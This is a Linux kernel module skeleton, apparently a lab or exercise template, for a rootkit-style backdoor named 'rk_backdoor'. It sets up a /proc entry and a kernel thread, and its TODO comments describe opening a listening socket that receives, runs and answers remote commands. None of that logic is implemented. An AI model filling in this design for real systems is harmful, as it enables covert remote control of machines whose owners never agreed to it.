// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/in.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/umh.h>
#include <net/sock.h>

static struct proc_dir_entry *entry;
static struct task_struct *listener;
static struct socket *listen_sock;

static int accept_loop(void *data)
{
	/* TODO: kernel_accept loop, recv commands, execute, send output */
	return 0;
}

static int backdoor_show(struct seq_file *m, void *v)
{
	/* TODO: use seq_printf(m, ...) or seq_puts(m, ...) */
	return 0;
}

static int __init backdoor_init(void)
{
	int err;

	/* TODO: sock_create, kernel_bind, kernel_listen */

	entry = proc_create_single("rk_backdoor", 0444, NULL, backdoor_show);
	if (!entry)
		return -ENOMEM;

	listener = kthread_run(accept_loop, NULL, "rk_backdoor");
	if (IS_ERR(listener)) {
		proc_remove(entry);
		return PTR_ERR(listener);
	}

	return 0;
}

static void __exit backdoor_exit(void)
{
	if (listen_sock)
		sock_release(listen_sock);
	if (listener)
		kthread_stop(listener);
	proc_remove(entry);
}

module_init(backdoor_init);
module_exit(backdoor_exit);

MODULE_LICENSE("GPL");
